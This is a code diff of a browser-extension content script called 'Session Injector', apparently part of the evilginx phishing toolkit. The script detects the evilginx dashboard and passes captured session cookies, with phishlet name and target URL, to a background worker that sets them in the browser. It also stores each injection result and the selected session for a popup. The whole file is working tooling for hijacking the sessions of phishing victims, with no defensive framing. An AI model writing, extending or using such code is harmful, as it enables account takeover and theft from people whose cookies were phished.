@@ -1,29 +1,54 @@
-// Evilginx Session Injector — content script
-// Detects evilginx dashboard pages and bridges inject requests to the
-// background worker which has the chrome.cookies.set() privilege.
+// Session Injector — content script
+// Activates only on pages that identify as the evilginx dashboard,
+// bridges inject requests to the background worker, and tracks session
+// selection state for the extension popup.
 
 (function () {
-  // Only activate on pages that identify themselves as the evilginx dashboard.
-  // The dashboard sets data-app="evilginx-dashboard" on <body>.
   if (!document.body || document.body.dataset.app !== 'evilginx-dashboard') return;
 
-  // Signal presence to the dashboard JS so it can switch to the fast path.
+  // Signal presence to the dashboard JS.
   window.__evilginxExtension = true;
   document.dispatchEvent(new CustomEvent('evilginx-extension-ready'));
 
-  // Listen for inject payloads posted by the dashboard's injectSession().
-  window.addEventListener('message', (event) => {
-    if (event.source !== window) return;
-    if (!event.data || event.data.type !== 'EVILGINX_INJECT') return;
+  // Mark dashboard as reachable for the popup.
+  chrome.storage.local.set({
+    dashboardConnected: true,
+    dashboardUrl: window.location.origin
+  });
 
-    const payload = event.data.payload;
+  // Clean up when the tab is unloaded.
+  window.addEventListener('unload', function () {
+    chrome.storage.local.set({ dashboardConnected: false });
+  });
 
-    chrome.runtime.sendMessage(
-      { action: 'inject', cookies: payload.cookies, targetUrl: payload.target_url },
-      (result) => {
-        // Forward the result back to the dashboard page.
-        window.dispatchEvent(new CustomEvent('evilginx-inject-result', { detail: result || {} }));
-      }
-    );
+  window.addEventListener('message', function (event) {
+    if (event.source !== window || !event.data) return;
+
+    // Inject request from dashboard.
+    if (event.data.type === 'EVILGINX_INJECT') {
+      var payload = event.data.payload;
+      chrome.runtime.sendMessage(
+        { action: 'inject', cookies: payload.cookies, targetUrl: payload.target_url },
+        function (result) {
+          var r = result || {};
+          // Store result for popup display.
+          chrome.storage.local.set({ lastInject: {
+            sessionId: payload.session_id,
+            phishlet:  payload.phishlet,
+            count:     r.success || 0,
+            failed:    r.failed  || 0,
+            targetUrl: payload.target_url,
+            time:      Date.now()
+          }});
+          // Forward result back to dashboard page.
+          window.dispatchEvent(new CustomEvent('evilginx-inject-result', { detail: r }));
+        }
+      );
+    }
+
+    // Session selected in dashboard — store for popup.
+    if (event.data.type === 'EVILGINX_SESSION_SELECT') {
+      chrome.storage.local.set({ currentSession: event.data.payload });
+    }
   });
 })();
